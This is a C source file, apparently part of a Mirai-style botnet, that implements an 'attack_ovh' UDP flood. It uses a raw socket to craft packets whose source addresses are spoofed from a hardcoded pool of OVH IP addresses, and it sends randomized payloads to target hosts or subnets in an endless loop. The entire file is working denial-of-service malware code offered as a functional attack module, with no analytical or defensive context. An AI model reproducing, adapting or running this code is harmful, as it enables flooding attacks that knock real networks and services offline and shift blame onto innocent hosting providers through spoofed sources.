#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>

#include "includes.h"
#include "attack.h"
#include "protocol.h"
#include "util.h"
#include "checksum.h"
#include "rand.h"

#define OVH_PHI 0xaaf219b9

static unsigned long int ovh_Q[4096], ovh_c = 362436;

static void ovh_srand(unsigned long int x)
{
    int i;
    ovh_Q[0] = x;
    ovh_Q[1] = x + OVH_PHI;
    ovh_Q[2] = x + OVH_PHI + OVH_PHI;
    for (i = 3; i < 4096; i++)
        ovh_Q[i] = ovh_Q[i - 3] ^ ovh_Q[i - 2] ^ OVH_PHI ^ i;
}

static unsigned long int ovh_rand(void)
{
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * ovh_Q[i] + ovh_c;
    ovh_c = (t >> 32);
    x = t + ovh_c;
    if (x < ovh_c)
    {
        x++;
        ovh_c++;
    }
    return (ovh_Q[i] = r - x);
}

void attack_ovh(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    int pps_limiter = attack_get_opt_int(opts_len, opts, ATK_OPT_PPS, 0);

    // Large pool of OVH source IPs for spoofing (already in network byte order)
    uint32_t ovh_ips[] = {
        2372231209, 2728286747, 1572769288, 3339925505, 2372233279, 3254787125,
        1160024353, 2328478311, 3266388596, 3238005002, 1745910789, 3455829265,
        1822614803, 3355015169, 3389792053, 757144879, 2734605396, 1230980369,
        3639549962, 2728310654, 3256452616, 3561573700, 2918529833, 2890221130,
        2918997764, 2453837834, 3369835018, 3256452681, 3007103780, 1137178634,
        3264375402, 3229415686, 2728310653, 3627732067, 2890220626, 1137178635,
        3391077889, 1745910533, 1755074592, 16843009, 1092011777, 3223532318,
        2918529914, 621985916, 2728287341, 1191626519, 2890184316, 1822618132,
        2372231209, 2728286747, 1572769288, 3339925505, 2372233279, 3254787125,
        1160024353, 2328478311, 3266388596, 3238005002, 1745910789, 3455829265,
        1822614803, 3355015169, 3389792053, 757144879, 2734605396, 1230980369
    };
    int num_ovh_ips = sizeof(ovh_ips) / sizeof(ovh_ips[0]);

    if (data_len > 1460)
        data_len = 1460;

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    ovh_srand(time(NULL));

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;

        pkts[i] = calloc(1510, sizeof(char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = ovh_ips[ovh_rand() % num_ovh_ips];
        iph->daddr = targs[i].addr;

        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof(struct udphdr) + data_len);
    }

    int sent = 0;

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);

            // Randomize source IP from OVH pool on each packet
            iph->saddr = ovh_ips[ovh_rand() % num_ovh_ips];

            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (ip_ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if (sport == 0xffff)
                udph->source = rand_next();
            if (dport == 0xffff)
                udph->dest = rand_next();

            // Randomize payload
            if (data_rand)
                rand_str((char *)(udph + 1), data_len);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + data_len);

            targs[i].sock_addr.sin_port = udph->dest;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));

            sent++;
            if (pps_limiter > 0 && sent >= pps_limiter)
            {
                sent = 0;
                usleep(1000);
            }
        }
    }
}
